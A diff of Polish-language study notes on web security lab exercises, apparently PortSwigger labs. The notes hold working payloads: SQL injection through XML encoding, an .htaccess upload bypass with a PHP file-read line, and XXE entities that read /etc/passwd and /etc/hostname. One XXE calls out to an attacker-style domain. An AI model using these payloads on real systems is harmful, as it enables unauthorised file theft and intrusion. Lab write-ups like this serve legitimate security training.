@@ -4,7 +4,7 @@
 
 ## Lab: SQL injection with filter bypass via XML encoding
 Payload:
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
   <stockCheck>
     <productId>
@@ -27,7 +27,7 @@ Plik `.htaccess`, który uruchamia plik `.php5`:
 AddType application/x-httpd-php .php5
 ```
 4. Następnie przesyłamy plik z rozszerzeniem `.php5` i wchodząc na link, który do niego prowadzi otrzymujemy wynik działania komendy:
-```
+```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
@@ -67,7 +67,7 @@ Jak to działa (chyba)?
 
 ## Lab: Exploiting blind XXE to retrieve data via error messages
 1. na naszym serwerze tworzymyh payload:
-``` 
+```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
@@ -129,11 +129,10 @@ notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwer
 XML w obrazie SVG:
 ```xml
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
 
 ## Lab: Blind XXE with out-of-band interaction
 XXE zapytanie do domeny:
-```
-
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
 
